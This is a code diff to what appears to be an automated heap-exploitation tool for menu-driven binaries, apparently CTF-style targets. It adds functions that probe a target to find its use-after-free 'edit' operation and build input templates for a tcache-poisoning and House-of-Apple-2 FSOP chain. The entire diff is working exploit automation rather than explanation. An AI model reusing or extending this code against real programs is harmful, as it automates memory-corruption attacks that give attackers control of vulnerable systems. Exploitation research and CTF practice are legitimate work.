@@ -300,7 +300,73 @@ def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) 
     free = next((o for o in idx_only if o != view), None)
     if free is None:
         return None
-    return {"add": add, "free": free, "view": view}
+    # EDIT (optional) -- an idx-then-data option that OVERWRITES a stored chunk (the UAF write that
+    # plants a poisoned tcache fd, which the FSOP chain needs). It hides from the crawl: its data
+    # read is guarded by a LIVE allocation at the index, which an isolated crawl never primes, so it
+    # looks idx-only (like free). Distinguish it from free by PRIMING a chunk, driving the candidate
+    # as idx+marker, and keeping the one whose write shows up in a subsequent view.
+    edit = None
+    for cand in [o for o in idx_only if o != view]:      # free-shaped options; one of them may be edit
+        m2 = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
+        ew = menu._scalar(cand.encode(), width) + menu._scalar(b"0", width) + menu._data(m2, width)
+        writes = (_op_writes(add, model[add], width, idx=0, size=0x80, data=b"X" * 8)
+                  + [ew]
+                  + _op_writes(view, model[view], width, idx=0))
+        out = _drive(workdir, exe, writes, timeout=8.0)
+        if m2 in out or m2.lower() in out.lower():
+            edit = cand
+            break
+    return {"add": add, "free": free, "view": view, "edit": edit}
+
+
+def _fsop_template(opt: str, fields: list) -> str | None:
+    """One menu op as a `_heap_menu_render` template (option then each field, in the crawled ORDER,
+    with {idx}/{size}/{data} placeholders). The chunk-content string becomes {data} (the LAST str, so
+    a leading name/label string gets a literal value instead); a trailing {data} carries no newline
+    (the FSOP blob is binary and last), every other field is newline-terminated."""
+    last_str = max((j for j, f in enumerate(fields) if f == "str"), default=-1)
+    parts = [opt]
+    for j, f in enumerate(fields):
+        if f == "idx":
+            parts.append("{idx}")
+        elif f == "num":
+            parts.append("{size}")
+        elif f == "yn" or f.startswith("yn="):
+            parts.append(f.split("=", 1)[1] if "=" in f else "y")
+        elif f == "str":
+            parts.append("{data}" if j == last_str else "A")
+        else:
+            return None
+    tmpl = "\n".join(parts)
+    return tmpl if last_str == len(fields) - 1 else tmpl + "\n"
+
+
+def fsop_templates(opts: list, model: dict, ops: dict, width) -> dict | None:
+    """Build the FSOP driver's op templates from a crawled op-model, so a NON-canonical menu (not
+    1=add/2=free/3=view/4=edit/5=exit) still drives the tcache-poison + House-of-Apple-2 chain. Needs
+    add/free/view AND edit (the UAF write that plants the poisoned fd). Line-based targets only (the
+    FSOP blob is raw bytes; a fixed-width protocol needs a different encoding). Returns
+    {add,free,view,edit,exit_seq} or None when a role or field shape is missing."""
+    if width:                                            # fixed-width binary protocol: not this driver
+        return None
+    if not all(ops.get(k) for k in ("add", "free", "view", "edit")):
+        return None
+    out: dict = {}
+    for role in ("add", "free", "view"):
+        t = _fsop_template(ops[role], model.get(ops[role], []))
+        if t is None:
+            return None
+        out[role] = t
+    # edit's data field is hidden from the crawl (it needs a live chunk), so model[edit] is idx-only;
+    # drive it as idx-then-data, matching how identify_heap_ops probed it.
+    out["edit"] = f"{ops['edit']}\n{{idx}}\n{{data}}"
+    used = {ops[k] for k in ("add", "free", "view", "edit")}
+    # Exit = an option that LEAVES the menu: it took no fields and did not loop back, so the crawl
+    # recorded nothing for it (absent from the model) -- prefer that, else any unused option.
+    exit_opt = next((o for o in opts if o not in used and o not in model), None) \
+        or next((o for o in opts if o not in used), None)
+    out["exit_seq"] = f"{exit_opt}\n" if exit_opt else "5\n"
+    return out
 
 
 def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, target_bytes: bytes,
